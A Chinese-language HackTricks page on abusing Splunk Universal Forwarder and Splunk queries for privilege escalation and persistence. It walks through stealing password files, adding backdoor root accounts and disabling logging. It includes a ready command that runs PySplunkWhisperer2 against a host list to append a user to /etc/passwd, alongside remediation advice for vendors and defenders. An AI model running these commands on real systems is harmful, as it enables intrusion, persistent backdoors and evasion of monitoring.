# Splunk LPE和持久性

<details>

<summary><strong>从零开始学习AWS黑客攻击直到成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**telegram群组**](https://t.me/peass)或在**Twitter**上**关注**我 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

如果您在**内部**或**外部**对机器进行**枚举**，发现运行着**Splunk**（端口8090），如果您幸运地知道任何**有效的凭据**，您可以**滥用Splunk服务**来**执行shell**作为运行Splunk的用户。如果是root在运行它，您可以将权限提升到root。

此外，如果您**已经是root并且Splunk服务没有仅在localhost上监听**，您可以**窃取**来自Splunk服务的**密码**文件并**破解**密码，或者**添加新的**凭据到它。并在主机上保持持久性。

在下面的第一张图片中，您可以看到Splunkd网页的样子。

**以下信息摘自** [**https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/**](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)

## 滥用Splunk Forwarders获取Shell和持久性

2020年8月14日

### 描述：<a href="#description" id="description"></a>

Splunk Universal Forwarder Agent（UF）允许经过认证的远程用户通过Splunk API向代理发送单个命令或脚本。UF代理不验证连接是否来自有效的Splunk Enterprise服务器，也不验证代码是否已签名或以其他方式证明来自Splunk Enterprise服务器。这允许攻击者在获得UF代理密码后，在服务器上以SYSTEM或root身份运行任意代码，具体取决于操作系统。

这种攻击正在被渗透测试人员使用，并且很可能正在被恶意攻击者在野外积极利用。获取密码可能导致客户环境中数百个系统的妥协。

Splunk UF密码相对容易获取，详见常见密码位置部分。

### 背景：<a href="#context" id="context"></a>

Splunk是一个数据聚合和搜索工具，通常用作安全信息和事件监控（SIEM）系统。Splunk Enterprise Server是一个在服务器上运行的Web应用程序，有称为Universal Forwarders的代理安装在网络中的每个系统上。Splunk为Windows、Linux、Mac和Unix提供代理二进制文件。许多组织使用Syslog将数据发送到Splunk，而不是在Linux/Unix主机上安装代理，但代理安装变得越来越流行。

Universal Forwarder可以在每个主机上通过https://host:8089访问。访问任何受保护的API调用，例如/service/，会弹出一个基本认证框。用户名始终是admin，密码默认曾经是changeme，直到2016年Splunk要求任何新安装设置8个字符或更高的密码。正如您在我的演示中注意到的，复杂性不是要求，因为我的代理密码是12345678。远程攻击者可以在没有锁定的情况下暴力破解密码，这是日志主机的必要条件，因为如果账户被锁定，那么日志将不再发送到Splunk服务器，攻击者可以利用这一点来隐藏他们的攻击。以下屏幕截图显示了Universal Forwarder代理，这个初始页面无需认证即可访问，并可用于枚举运行Splunk Universal Forwarder的主机。

![0](https://eapolsniper.github.io/assets/2020AUG14/11\_SplunkAgent.png)

Splunk文档显示使用相同的Universal Forwarding密码对所有代理，我不确定这是否是要求，或者是否可以为每个代理设置单独的密码，但基于文档和我作为Splunk管理员时的记忆，我相信所有代理必须使用相同的密码。这意味着如果在一个系统上找到或破解了密码，它很可能在所有Splunk UF主机上都有效。这是我个人的经验，允许快速妥协数百个主机。

### 常见密码位置：<a href="#common-password-locations" id="common-password-locations"></a>

我经常在网络上的以下位置找到Splunk Universal Forwarding代理的明文密码：

1. Active Directory Sysvol/domain.com/Scripts目录。管理员将可执行文件和密码存储在一起，以便高效地安装代理。
2. 托管IT安装文件的网络文件共享
3. 内部网络上的Wiki或其他构建笔记存储库

密码也可以在Windows主机的Program Files\Splunk\etc\passwd中以哈希形式访问，在Linux和Unix主机的/opt/Splunk/etc/passwd中访问。攻击者可以尝试使用Hashcat破解密码，或者租用云破解环境以增加破解哈希的可能性。密码是强大的SHA-256哈希，因此不太可能破解强大、随机的密码。

### 影响：<a href="#impact" id="impact"></a>

拥有Splunk Universal Forward Agent密码的攻击者可以完全妥协网络中的所有Splunk主机，并在每个主机上获得SYSTEM或root级别的权限。我已经成功地在Windows、Linux和Solaris Unix主机上使用了Splunk代理。这种漏洞可能允许系统凭据被转储、敏感数据被窃取或勒索软件被安装。这种漏洞快速、易于使用且可靠。

由于Splunk处理日志，攻击者可以在第一次运行命令时重新配置Universal Forwarder，更改Forwarder位置，禁用对Splunk SIEM的日志记录。这将大大降低被客户蓝队发现的机会。

Splunk Universal Forwarder通常安装在域控制器上进行日志收集，这可以轻松地让攻击者提取NTDS文件，禁用杀毒软件以进行进一步利用，和/或修改域。

最后，Universal Forwarding Agent不需要许可证，并且可以单独配置密码。因此，攻击者可以在主机上安装Universal Forwarder作为后门持久性机制，因为它是一个合法的应用程序，即使是那些不使用Splunk的客户，也不太可能移除。

### 证据：<a href="#evidence" id="evidence"></a>

为了展示一个利用示例，我使用最新的Splunk版本为Enterprise Server和Universal Forwarding代理设置了一个测试环境。共附加了10张图片到这份报告中，展示了以下内容：

1- 通过PySplunkWhisper2请求/etc/passwd文件

![1](https://eapolsniper.github.io/assets/2020AUG14/1\_RequestingPasswd.png)

2- 通过Netcat在攻击者系统上接收/etc/passwd文件

![2](https://eapolsniper.github.io/assets/2020AUG14/2\_ReceivingPasswd.png)

3- 通过PySplunkWhisper2请求/etc/shadow文件

![3](https://eapolsniper.github.io/assets/2020AUG14/3\_RequestingShadow.png)

4- 通过Netcat在攻击者系统上接收/etc/shadow文件

![4](https://eapolsniper.github.io/assets/2020AUG14/4\_ReceivingShadow.png)

5- 将用户attacker007添加到/etc/passwd文件中

![5](https://eapolsniper.github.io/assets/2020AUG14/5\_AddingUserToPasswd.png)

6- 将用户attacker007添加到/etc/shadow文件中

![6](https://eapolsniper.github.io/assets/2020AUG14/6\_AddingUserToShadow.png)

7- 接收新的/etc/shadow文件，显示成功添加了attacker007

![7](https://eapolsniper.github.io/assets/2020AUG14/7\_ReceivingShadowFileAfterAdd.png)

8- 确认使用attacker007账户的SSH访问受害者

![8](https://eapolsniper.github.io/assets/2020AUG14/8\_SSHAccessUsingAttacker007.png)

9- 添加一个后门root账户，用户名为root007，uid/gid设置为0

![9](https://eapolsniper.github.io/assets/2020AUG14/9\_AddingBackdoorRootAccount.png)

10- 使用attacker007确认SSH访问，然后使用root007升级到root

![10](https://eapolsniper.github.io/assets/2020AUG14/10\_EscalatingToRoot.png)

此时，我通过Splunk和创建的两个用户账户持久访问主机，其中一个提供root。我可以禁用远程日志记录来掩盖我的行踪，并继续使用这个主机攻击系统和网络。

编写PySplunkWhisperer2脚本非常简单且有效。

1. 创建一个文件，包含您想要利用的主机的IP，示例名称ip.txt
2. 运行以下命令：
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
主机信息：

Splunk Enterprise Server：192.168.42.114\
Splunk Forwarder Agent 受害者：192.168.42.98\
攻击者：192.168.42.51

Splunk Enterprise 版本：8.0.5（截至 2020 年 8 月 12 日实验室设置当天的最新版本）\
Universal Forwarder 版本：8.0.5（截至 2020 年 8 月 12 日实验室设置当天的最新版本）

#### Splunk, Inc 的修复建议：<a href="#remediation-recommendations-for-splunk-inc" id="remediation-recommendations-for-splunk-inc"></a>

我建议实施以下所有解决方案以提供深度防御：

1. 理想情况下，Universal Forwarder 代理根本不会开放端口，而是会定期轮询 Splunk 服务器以获取指令。
2. 启用客户端和服务器之间的 TLS 双向认证，并为每个客户端使用单独的密钥。这将在所有 Splunk 服务之间提供非常高的双向安全性。TLS 双向认证在代理和物联网设备中得到了大量实施，这是受信任设备客户端到服务器通信的未来。
3. 将所有代码、单行或脚本文件发送在由 Splunk 服务器加密和签名的压缩文件中。这不保护通过 API 发送的代理数据，但可以防止第三方恶意远程代码执行。

#### Splunk 客户的修复建议：<a href="#remediation-recommendations-for-splunk-customers" id="remediation-recommendations-for-splunk-customers"></a>

1. 确保为 Splunk 代理设置非常强的密码。我建议至少使用 15 个字符的随机密码，但由于这些密码从不输入，可以设置非常长的密码，例如 50 个字符。
2. 配置基于主机的防火墙，只允许 Splunk 服务器到端口 8089/TCP（Universal Forwarder 代理的端口）的连接。

### 红队的建议：<a href="#recommendations-for-red-team" id="recommendations-for-red-team"></a>

1. 下载每个操作系统的 Splunk Universal Forwarder 副本，因为它是一个很好的轻量级签名植入物。好在 Splunk 实际修复此问题的情况下保留副本。

### 其他研究人员的漏洞/博客 <a href="#exploitsblogs-from-other-researchers" id="exploitsblogs-from-other-researchers"></a>

可用的公开漏洞：

* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487

相关博客文章：

* https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/
* https://medium.com/@airman604/splunk-universal-forwarder-hijacking-5899c3e0e6b2
* https://www.hurricanelabs.com/splunk-tutorials/using-splunk-as-an-offensive-security-tool

_\*\* 注意：\*\*_ 这个问题是 Splunk 系统的一个严重问题，多年来已被其他测试人员利用。虽然远程代码执行是 Splunk Universal Forwarder 的预期功能，但其实现方式却很危险。我试图通过 Splunk 的漏洞赏金计划提交这个漏洞，非常不可能他们不知道设计的影响，但被告知任何漏洞提交都实施 Bug Crowd/Splunk 披露政策，该政策规定在没有 Splunk 许可的情况下，漏洞的任何细节都不得公开讨论。我请求了一个 90 天的披露时间表并被拒绝。因此，我没有负责任地披露这一点，因为我相当确定 Splunk 知道这个问题并选择忽略它，我觉得这可能严重影响公司，向企业界教育是信息安全社区的责任。

## 滥用 Splunk 查询

信息来自 [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)

**CVE-2023-46214** 允许将任意脚本上传到 **`$SPLUNK_HOME/bin/scripts`**，然后解释说使用搜索查询 **`|runshellscript script_name.sh`** 可以**执行**存储在那里的**脚本**：

<figure><img src="../../.gitbook/assets/image (721).png" alt=""><figcaption></figcaption></figure>

<details>

<summary><strong>从零开始学习 AWS 黑客攻击，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 HackTricks 中看到您的**公司广告**或**下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs**](https://opensea.io/collection/the-peass-family) 收藏品
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享您的黑客技巧**。

</details>
